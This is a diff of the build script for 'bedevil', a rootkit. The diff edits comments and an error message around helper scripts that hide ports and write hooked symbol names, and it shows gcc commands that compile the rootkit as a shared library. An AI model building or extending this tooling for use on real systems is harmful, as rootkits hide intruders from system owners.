@@ -3,13 +3,13 @@
 tty -s && clear && [ -f .ascii ] && \
     printf "\e[1m\e[31m`cat .ascii`\e[0m\n"
 
-# contains functions for getting random stuff. see for more info.
+# random stuff.
 source ./etc/random.sh
 
-# contains a bunch of miscellaneous functions. see for more info.
+# miscellaneous functions.
 source ./etc/util.sh
 
-# default values for necessary variables.
+# default values for things.
 source ./etc/defaults.sh
 
 # contains, mainly, functions for use with dialog.
@@ -25,20 +25,20 @@ source ./etc/toggles.sh
 # directories & paths included by includes.h
 source ./etc/headers.sh
 
-# functions responsible for locating & writing
-# arrays within rootkit include directories.
+# functions responsible for locating & then writing C arrays.
+# actually now only used for writing hooked symbol names, iirc.
 source ./etc/arrays.sh
 
 # the functions within this script handle setting up
 # ports & ranges to be hidden before writing them
-# to a destination.
+# to their destination.
 source ./etc/hideports.sh
 
 # the functions in this script are what makes the
 # magic happen when it comes to finding & writing
-# rootkit settings. the current system we have for
-# this is no way near efficient enough.
-# (IT'S SLOW AS HELL!!!!)
+# rootkit settings. the entire system that was birthed
+# from this script was just pretty bad all round. slow
+# was an understatement. but this is the case no longer.
 source ./etc/settings.sh
 
 # prepares our environment.
@@ -46,7 +46,7 @@ source ./etc/postinstall.sh
 
 compile_bdvl(){
     [ ! -d "$NEW_MDIR" ] && { \
-        eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; \
+        eecho "'$NEW_MDIR' doesn't exist, wyd?"; \
         exit; \
     }
 
@@ -63,6 +63,7 @@ compile_bdvl(){
     [ $PLATFORM == "armv7l" ] && PLATFORM="v7l"
     [ $PLATFORM == "armv6l" ] && PLATFORM="v6l"
 
+    # build the commands for both. then execute 
     local compile_reg="gcc -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
                       -I$NEW_MDIR -shared ${linker_flags[*]} ${linker_options[*]} -o $BDVLSO.$PLATFORM"
     local compile_m32="gcc -m32 -std=gnu99 ${optimization_flags[*]} $NEW_MDIR/bedevil.c ${warning_flags[*]} ${options[*]} \
